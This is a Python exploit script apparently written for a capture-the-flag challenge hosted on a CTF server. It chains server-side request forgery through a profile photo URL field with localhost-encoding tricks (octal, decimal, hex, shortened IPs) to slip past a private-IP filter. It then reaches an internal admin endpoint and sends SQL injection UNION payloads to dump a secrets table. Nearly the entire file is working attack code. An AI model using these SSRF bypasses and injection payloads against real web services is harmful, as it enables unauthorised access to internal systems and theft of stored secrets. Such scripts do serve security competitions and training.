#!/usr/bin/env python3
import requests
import urllib.parse

# Target URL
BASE_URL = "http://ctf.compfest.id:7302"

def register_and_login():
    """Register a new user and login"""
    username = "hacker"
    password = "hacker123"
    
    # Register
    data = {'username': username, 'password': password}
    requests.post(f"{BASE_URL}/register", data=data)
    
    # Login
    response = requests.post(f"{BASE_URL}/login", data=data, allow_redirects=False)
    if response.status_code == 302:
        return response.cookies
    return None

def exploit():
    """Main exploit function"""
    print("[+] Dark Side of Asteroid - Targeted Exploit")
    print("[+] ========================================")
    
    # Get session
    cookies = register_and_login()
    if not cookies:
        print("[-] Failed to login!")
        return
    
    print("[+] Successfully logged in!")
    
    # The key insight: The SSRF bypass and SQL injection combination
    # We need to bypass the private IP check and access the internal endpoint
    
    # Method 1: Try different localhost representations that might bypass the check
    localhost_variants = [
        "http://127.0.0.1:5000/internal/admin/search",
        "http://localhost:5000/internal/admin/search", 
        "http://0.0.0.0:5000/internal/admin/search",
        "http://0177.0.0.1:5000/internal/admin/search",  # Octal
        "http://2130706433:5000/internal/admin/search",  # Decimal
        "http://0x7f.0x0.0x0.0x1:5000/internal/admin/search",  # Hex
        "http://017700000001:5000/internal/admin/search",  # Combined octal
        "http://127.1:5000/internal/admin/search",  # Shortened
        "http://127.0.1:5000/internal/admin/search",  # Alternative
    ]
    
    # SQL injection payloads that contain 'access_level' to bypass the filter
    sql_payloads = [
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets WHERE access_level=3--",
        "access_level' OR access_level=3--",
        "access_level' AND access_level<=3--",
        "access_level' UNION SELECT 'Flag',secret_value FROM admin_secrets WHERE secret_name='Flag'--",
        "access_level' UNION SELECT secret_name,secret_value FROM admin_secrets--",
    ]
    
    print("[+] Testing SSRF bypass techniques...")
    
    for base_url in localhost_variants:
        print(f"[*] Trying base URL: {base_url}")
        
        for sql_payload in sql_payloads:
            # Construct the full URL with SQL injection
            full_url = f"{base_url}?q={urllib.parse.quote(sql_payload)}"
            
            print(f"[*] Testing: {full_url}")
            
            # Use the profile upload feature to trigger SSRF
            data = {'photo_url': full_url}
            
            try:
                response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
                
                # Check if we got a successful response
                if response.status_code == 200:
                    # Look for the flag in the response
                    if "COMPFEST" in response.text:
                        print(f"[+] SUCCESS! Found flag!")
                        print(f"[+] Response: {response.text}")
                        return
                    
                    # Check error preview (when content is not an image)
                    if "Failed to render as image" in response.text:
                        # Extract content from the <pre> tag
                        start = response.text.find("<pre>")
                        end = response.text.find("</pre>")
                        if start != -1 and end != -1:
                            preview = response.text[start+5:end]
                            if "COMPFEST" in preview or "Flag" in preview:
                                print(f"[+] SUCCESS! Found flag in error preview!")
                                print(f"[+] Preview: {preview}")
                                return
                            elif "Access denied" not in preview and "Error" not in preview:
                                print(f"[+] Got interesting response: {preview[:200]}")
                
            except Exception as e:
                print(f"[-] Error: {e}")
                continue
    
    print("[-] SSRF exploit failed. Trying alternative approaches...")
    
    # Method 2: Try different ports
    ports = [80, 8080, 3000, 8000, 5000]
    for port in ports:
        base_url = f"http://127.0.0.1:{port}/internal/admin/search"
        full_url = f"{base_url}?q={urllib.parse.quote('access_level')}"
        
        print(f"[*] Trying port {port}: {full_url}")
        
        data = {'photo_url': full_url}
        try:
            response = requests.post(f"{BASE_URL}/profile", data=data, cookies=cookies, timeout=10)
            if response.status_code == 200 and "COMPFEST" in response.text:
                print(f"[+] SUCCESS with port {port}!")
                print(f"[+] Response: {response.text}")
                return
        except:
            continue
    
    print("[-] All attempts failed.")

if __name__ == "__main__":
    exploit()
